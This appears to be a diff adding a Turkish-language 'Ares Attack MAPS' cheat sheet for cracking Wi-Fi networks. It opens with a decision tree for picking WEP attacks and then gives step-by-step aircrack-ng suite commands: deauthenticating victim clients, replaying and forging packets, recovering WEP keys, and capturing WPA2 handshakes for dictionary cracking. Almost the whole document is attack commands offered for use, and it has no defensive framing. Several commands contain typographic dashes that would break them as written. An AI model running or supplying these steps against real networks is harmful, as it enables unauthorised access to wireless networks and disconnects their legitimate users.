@@ -1,0 +1,73 @@
+Ares Attack MAPS
+
+
+WEP mi, WPA/WPA2 mi?
+- WEP
+- - Open Authentication mu Shared Key Authentication mu?
+- - - Open Authenticaton
+- - - - Herhangi bir client ağa bağlı mı?
+- - - - - Evet, bağlı:
+- - - - - - # Arp Request Replay Saldırısı
+- - - - - - # Interactive Packet Replay Saldırısı
+- - - - - Hayır, bağlı değil:
+- - - - - - # Korek ChopChop Saldırısı
+- - - - - - # Fragmentation Attack
+- - - Shared Key Authenticaton
+- - - - Herhangi bir client ağa bağlı mı?
+- - - - - Evet, bağlı:
+- - - - - - # Fake Shared Key Authentication Saldırısı
+- - - - - - # Arp Request Replay Saldırısı
+- - - - - Hayır, bağlı değil:
+- - - - - - Client bekle...
+
+
+Ares WEP CRACKING
+
+Method Ares SKA Attack : SKA (Shared Key Authentication) Type Cracking
+
+root@ar3s:~# airmon-ng start wlan0
+root@ar3s:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@ar3s:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@ar3s:~# airodump-ng –1 60 -e <essid> -y sharedkey.xor -a $AP -h $MON mon0 
+root@ar3s:~# aireplay-ng -3 –b <BSSID> -h <MON> mon0
+root@ar3s:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@ar3s:~# aircrack-ng -0 -z -n 64 <PCAP_of_FileName>
+
+Method Ares Open Authentication Attack : OPN Clientless WEP
+
+root@ar3s:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@ar3s:~# aireplay-ng -1 60 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@ar3s:~# aireplay-ng -5 –b<BSSID> -h < OurMac > mon0
+root@ar3s:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k 192.168.1.255 -l 192.168.1.100 -y <XOR_PacketFile> -w <FileName1> => DATA 0
+root@ar3s:~# aireplay-ng -2 –r <FileName1> mon0 => DATA artmaya başlayacak
+root@ar3s:~# aireplay-ng -4 –b <BSSID> -h <OurMac> mon0
+root@ar3s:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k 192.168.1.255 -l 192.168.1.100 -y <XOR_PacketFile> -w <FileName2>
+root@ar3s:~# aireplay-ng -2 –r <FileName1> mon0
+root@ar3s:~# aircrack-ng <PCAP_of_FileName> -0
+
+Method Ares Open Authentication Attack : OPN Client WEP
+
+root@ar3s:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@ar3s:~# aireplay-ng -1 60 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@ar3s:~# aireplay-ng -2 -b <BSSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
+root@ar3s:~# aircrack-ng -0 -z -n 64 <PCAP_of_FileName>
+
+
+Method Ares Open Authentication Attack : OPN Clients WEP
+
+root@ar3s:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@ar3s:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@ar3s:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@ar3s:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@ar3s:~# aireplay-ng -3 –b <BSSID> -h <MON> mon0
+root@ar3s:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@ar3s:~# aircrack-ng <PCAP_of_FileName> -0
+
+Ares WPA / WPA2 CRACKING
+
+Method Ares Dictionary Attack : PSK Client WPA2
+
+root@ar3s:~# airmon-ng start wlan0
+root@ar3s:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@ar3s:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@ar3s:~# aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>
